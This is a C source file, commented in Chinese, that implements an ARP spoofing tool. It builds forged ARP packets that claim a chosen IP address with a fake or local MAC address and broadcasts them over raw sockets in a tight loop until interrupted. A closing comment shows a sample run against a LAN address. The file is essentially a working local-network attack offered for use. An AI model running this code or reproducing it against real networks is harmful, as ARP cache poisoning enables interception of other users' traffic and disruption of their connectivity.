#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <signal.h>
#include <pthread.h>

#include "arp_deceive.h"
#include "print_errno.h"

static int arp_send_fd;                                /* 发送arp请求的socket */           
static int arp_recv_fd;                                /* 接收arp响应的socket */                     
static char ar_sd_exit;                                /* 标记,arp请求的socket是否建立 */
static char ar_rv_exit;                                /* 标记,arp响应的socket是否建立 */
static struct sockaddr_ll sl;                          /* 设备无关的物理层地址结构 */
static struct arp_packet arp_send_buf;                 /* arp请求实体 */
static int deceive_interval_ms = 1;                    /* 每次发送数据包的时间间隔 */
static char flag_stop;                                 /* 停止发包的标志 */
static char mac_bcast[MAC_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; /* 广播地址 */
static char mac_trick[MAC_LEN] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06}; /* 伪装地址 */
static char mac_local[MAC_LEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; /* 本机地址 */

/***************************************************************/
/* 函  数：sig_int **********************************************/
/* 说  明：SIGINT信号处理函数 *************************************/
/* 参  数：SIGINT信号值 ******************************************/
/* 返回值：无 ****************************************************/
/***************************************************************/
static void sig_int(int signum)
{
	flag_stop = 1;
	printf("\n");
	
	return;
}

/***************************************************************/
/* 函  数：arp_init *********************************************/
/* 说  明：初始化套接字和struct sockaddr_ll ***********************/
/* 参  数：flag 0 接收arp响应套接字初始化 **************************/
/*      ：     非0 发送arp请求套接字初始化 **************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
static void arp_init(char flag)
{
	struct timeval tv_out;
	
	if(flag == 0)
	{
		if(!ar_rv_exit)
		{
			ar_rv_exit = 1;
			if((arp_recv_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
			{
				ar_rv_exit = 0;
				fprintf(stdout, "ARP receiver's socket error!\n");
				return;
			}
			tv_out.tv_sec = 1;
			tv_out.tv_usec = 0;
			setsockopt(arp_recv_fd, SOL_SOCKET, SO_RCVTIMEO, &tv_out, sizeof(tv_out)); /* recv超时时间为1s */
		}
	}
	else
	{
		if(!ar_sd_exit)
		{
			ar_sd_exit = 1;
			if((arp_send_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
			{
				ar_sd_exit = 0;
				fprintf(stdout, "ARP sender's socket error!\n");
				return;
			}
			memset(&arp_send_buf, 0, sizeof(arp_send_buf));
			arp_send_buf.eth_type = htons(0x0806);
			arp_send_buf.ar_hrd = htons(0x1);
			arp_send_buf.ar_pro = htons(0x0800);
			arp_send_buf.ar_hln = MAC_LEN;
			arp_send_buf.ar_pln = IP_LEN;
			arp_send_buf.ar_op = htons(0x1);
			
			memset(&sl, 0, sizeof(sl));
			sl.sll_family = AF_PACKET;
			sl.sll_protocol = htons(ETH_P_ALL);
		}
	}
	
	return;
}

/***************************************************************/
/* 函  数：set_time *********************************************/
/* 说  明：修改每次发包的时间间隔 **********************************/
/* 参  数：毫秒 *************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void set_time(unsigned int interval_ms)
{
	deceive_interval_ms = interval_ms;
	
	return;
}

/***************************************************************/
/* 函  数：arp_receive ******************************************/
/* 说  明：接收arp响应 *******************************************/
/* 参  数：无 ***************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
static void arp_receive()
{
	int ret, cnt, i;
	char buf[ETHER_ARP_PACKET_LEN + 1];
	struct arp_packet *arp;
	struct in_addr *ip;
	
    arp = (struct arp_packet *)buf;
    ip = (struct in_addr *)&(arp->ar_sip);
    cnt = 0;
	while (1)
	{
		memset(buf, 0, sizeof(buf));
		ret = recv(arp_recv_fd, buf, sizeof(buf), 0);
		if(ret > 0)
		{
			/* arp操作码为2代表arp应答 */
			if(arp->ar_op == htons(0x2))
			{
				printf("==========================arp replay======================\n");
				printf("from ip: %s\n", inet_ntoa(*ip));
				
				printf("from mac");
				for (i = 0; i < MAC_LEN; i++)
					printf(":%02x", arp->ar_sha[i]);
				printf("\n");
				return;
			}
			else
			{
				cnt++;
			}
		}
		else
		{
			cnt++;
		}
		if(cnt > 15)
		{
			fprintf(stdout, "ARP receiver error\n");
			signal(SIGINT, SIG_DFL);
			return;
		}
	}
	
	return;
}

/***************************************************************/
/* 函  数：arp_send *********************************************/
/* 说  明：发送arp包 *********************************************/
/* 参  数：buf  请求包的内容 **************************************/
/*        size 请求包的长度 **************************************/
/*        times 发送的次数 **************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void arp_send(int times)
{
	int i, ret;
	
	for(i = 0; i < times; i++)
	{
		ret = sendto(arp_send_fd, &arp_send_buf, sizeof(arp_send_buf), 0, (struct sockaddr*)&sl, sizeof(sl));
		if(ret == -1)
		{
			printf("Send Error!\n");
			return;
		}
		else
		{
			printf("Arp sends %d bytes!\n", ret);
		}
	}
	
	return;
}

/***************************************************************/
/* 函  数：arp_deceive ******************************************/
/* 说  明：arp欺骗 ***********************************************/
/* 参  数：deveice_name 发送数据包的网卡设备 ************************/
/*        trick_ip 伪装的ip *************************************/
/*        target_ip 目标的ip ************************************/
/*        flag 0 使用伪造mac ************************************/
/*             非0 使用本机mac **********************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void arp_deceive(char *deveice_name, char *trick_ip, char *target_ip, char flag)
{
	int i;
	struct in_addr inaddr_tmp;
	struct ifreq ifr;
	
	arp_init(1);
	strncpy(ifr.ifr_name, deveice_name, sizeof(ifr.ifr_name) - 1);
	if(ioctl(arp_send_fd, SIOCGIFINDEX, &ifr) < 0) 
	{
        print_errno("ioctl() SIOCGIFINDEX failed!\n");
        return;
    }
    sl.sll_ifindex = ifr.ifr_ifindex;
    
    if(inet_aton(trick_ip, &inaddr_tmp) == 0)
    {
		printf("Invalid IP!\n");
		return;
	}
	memcpy(&arp_send_buf.ar_sip, &inaddr_tmp, sizeof(inaddr_tmp));
	if(inet_aton(target_ip, &inaddr_tmp) == 0)
    {
		printf("Invalid IP!\n");
		return;
	}
	memcpy(&arp_send_buf.ar_dip, &inaddr_tmp, sizeof(inaddr_tmp));
 
	memcpy(arp_send_buf.eth_dst, mac_bcast, MAC_LEN);
	if(flag)
	{
		if(ioctl(arp_send_fd, SIOCGIFHWADDR, &ifr) < 0)
		{
			printf("ioctl() SIOCGIFHWADDR failed! \n");
			return;
		}
		for(i = 0; i < MAC_LEN; i++)
		{
			mac_local[i] = ifr.ifr_hwaddr.sa_data[i];
		}
	
		memcpy(arp_send_buf.eth_src, mac_local, MAC_LEN);
		memcpy(arp_send_buf.ar_sha, mac_local, MAC_LEN);
	}
	else
	{
		memcpy(arp_send_buf.eth_src, mac_trick, MAC_LEN);
		memcpy(arp_send_buf.ar_sha, mac_trick, MAC_LEN);
	}
	memset(arp_send_buf.ar_dha, 0, MAC_LEN);
	
	signal(SIGINT, sig_int);
	while(1)
	{
		arp_send(1);
		usleep(deceive_interval_ms * 1000);
		if(flag_stop)
		{
			flag_stop = 0;
			signal(SIGINT, SIG_DFL);
			return;
		}
	}
	
	return;
}
//arp wlp3s0 192.168.1.111 192.168.1.103
